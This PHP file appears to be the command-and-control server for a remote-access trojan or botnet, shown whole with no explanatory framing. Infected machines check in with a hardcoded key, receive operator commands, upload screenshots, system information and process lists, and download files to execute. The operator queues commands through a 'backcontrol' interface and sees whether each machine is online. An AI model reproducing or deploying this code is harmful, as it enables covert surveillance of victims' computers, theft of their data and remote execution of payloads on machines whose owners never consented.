<?php
define('ACCESS_KEY', 'MOONSTONE_0193341859');
$return = "DEFAULT_VALUE";
$error = false;
$ERROR_CODE = "DEFAULT_VALUE";
if((isset($_GET['key']) && !empty($_GET['key']) && $_GET['key'] == ACCESS_KEY) &&
(isset($_GET['machine']) && !empty($_GET['machine']) && strlen($_GET['machine']) === 20)) {

	if($_GET['action'] != 'backcontrol') {
		if (!is_dir($_GET['machine'])) {
			mkdir($_GET['machine']);
		}
		$files = array(
		"pcinfo",
		"tasklist",
		"screenshot",
		"data",
		"com",
		"checkin");
		foreach ($files as $value) {
			if (!file_exists($_GET['machine'] . "\\" . $value)) {
				$operation = fopen($_GET['machine'] . "\\" . $value, "w");
				fclose($operation);
			}
		}
		file_put_contents($_GET['machine'].'/checkin', time());
	}

	if(isset($_GET['action']) && !empty($_GET['action'])) {
		
		if($_GET['action'] == "getcommand") {
			$return = "<?xml version=\"1.0\" encoding=\"UTF-8\"?>
			<main>
			  <directive>".file_get_contents($_GET['machine']."\com")."</directive>
			  <data>".base64_encode(file_get_contents($_GET['machine']."\data"))."</data>
			  <request>
				<status>OK</status>
			  </request>
			</main>";
			if(file_get_contents($_GET['machine']."\com") != "") {
				file_put_contents($_GET['machine']."\com", "");
			}
		}
		
		if($_GET['action'] == "upload") {		
			if($_GET['type'] == "screenshot") {
				if ($_FILES["file"]["error"] > 0) {
					$return = "<?xml version=\"1.0\" encoding=\"UTF-8\"?>
					<main>
					  <request>
						<status>NOT_OK</status>
						<action>".$_GET['action']."</action>
						<type>".$_GET['type']."</type>
					  </request>
					</main>";
				} else {
					move_uploaded_file($_FILES["file"]["tmp_name"], $_GET['machine']."\screenshot");
					$return = "<?xml version=\"1.0\" encoding=\"UTF-8\"?>
					<main>
					  <request>
						<status>OK</status>
						<action>".$_GET['action']."</action>
						<type>".$_GET['type']."</type>
					  </request>
					</main>";
				}
			}
			
			if($_GET['type'] == "pcinfo") {
				if(isset($_POST['BUILD_INFO']) && isset($_POST['SIGNATURE']) && $_POST['SIGNATURE'] == strtoupper(md5($_POST['BUILD_INFO'].ACCESS_KEY."8832849224".$_GET['machine']))) {
					file_put_contents($_GET['machine']."\pcinfo", trim($_POST['BUILD_INFO']));
					$return = "<?xml version=\"1.0\" encoding=\"UTF-8\"?>
					<main>
					  <request>
						<status>OK</status>
						<action>".$_GET['action']."</action>
						<type>".$_GET['type']."</type>
					  </request>
					</main>";
				} else {
					$return = "<?xml version=\"1.0\" encoding=\"UTF-8\"?>
					<main>
					  <request>
						<status>NOT_OK</status>
						<action>".$_GET['action']."</action>
						<type>".$_GET['type']."</type>
					  </request>
					</main>";
				}
			}
			
			if($_GET['type'] == "tasklist") {
				if(isset($_POST['TASK_LIST']) && isset($_POST['SIGNATURE']) && $_POST['SIGNATURE'] == strtoupper(md5($_POST['TASK_LIST'].ACCESS_KEY."5729641964".$_GET['machine']))) {
					file_put_contents($_GET['machine']."\\tasklist", trim($_POST['TASK_LIST']));
					$return = "<?xml version=\"1.0\" encoding=\"UTF-8\"?>
					<main>
					  <request>
						<status>OK</status>
						<action>".$_GET['action']."</action>
						<type>".$_GET['type']."</type>
					  </request>
					</main>";
				} else {
					$return = "<?xml version=\"1.0\" encoding=\"UTF-8\"?>
					<main>
					  <request>
						<status>NOT_OK</status>
						<action>".$_GET['action']."</action>
						<type>".$_GET['type']."</type>
					  </request>
					</main>";
				}
			}
			
		}
		
		if($_GET['action'] == "download") {
			
			if($_GET['type'] == "fuplandexec") {
				if($_GET['signature'] == strtoupper(md5(file_get_contents($_GET['machine']."/data").ACCESS_KEY."5285103762".$_GET['machine']))) {
					$ReadFile = $_GET['machine']."/".file_get_contents($_GET['machine']."/data").".dl";
					if(file_exists($ReadFile)) {
						readfile($ReadFile);
						unlink($ReadFile);
						if(file_get_contents($_GET['machine']."\data") != "") {
							file_put_contents($_GET['machine']."\data", "");
						}
						exit;	
					} else {
						$ERROR_CODE = "6427852016";
					}
				} else {
					$return = "<?xml version=\"1.0\" encoding=\"UTF-8\"?>
					<main>
					  <request>
						<status>NOT_OK</status>
						<action>".$_GET['action']."</action>
						<type>".$_GET['type']."</type>
					  </request>
					</main>";
				}
			} 
			
		}


		if($_GET['action'] == "backcontrol") {
			if($_GET['type'] == 'handshake') {
				if(file_exists($_GET['machine'].'/com')) {
					$return = "<?xml version=\"1.0\" encoding=\"UTF-8\"?>
					<main>
					  <data>".file_get_contents($_GET['machine'].'/com')."</data>
					  <property>".(time() - filemtime($_GET['machine'].'/checkin') <= 20?'online':'offline')."</property>
					  <request>
						<status>OK</status>
						<action>".$_GET['action']."</action>
						<type>".$_GET['type']."</type>
					  </request>
					</main>";	
				} else {
					$error = "Machine ID Not Found: ".$_GET['machine'];
				}
			}
			
			if($_GET['type'] == 'commandupload') {
				if(file_exists($_GET['machine'].'/com')) {
					if(file_get_contents('php://input') == "CLEAR") {
						file_put_contents($_GET['machine'].'/com', "");
					} else {
						file_put_contents($_GET['machine'].'/com', file_get_contents('php://input'));
					}
					$return = "<?xml version=\"1.0\" encoding=\"UTF-8\"?>
					<main>
					  <request>
						<status>OK</status>
						<action>".$_GET['action']."</action>
						<type>".$_GET['type']."</type>
					  </request>
					</main>";
				} else {
					$error = "Machine ID Not Found: ".$_GET['machine'];
				}
			}
			
		}
		
		
	}

}



if($return != "DEFAULT_VALUE" && $error == false) {
	echo $return;
} else {
	echo "<?xml version=\"1.0\" encoding=\"UTF-8\"?>
<main>
  <request>
	<status>ERROR</status>
	<details>".($ERROR_CODE != "DEFAULT_VALUE"?"Server Error: 6427852016":($error!=false?$error:"Invalid Request."))."</details>
  </request>
</main>";
}
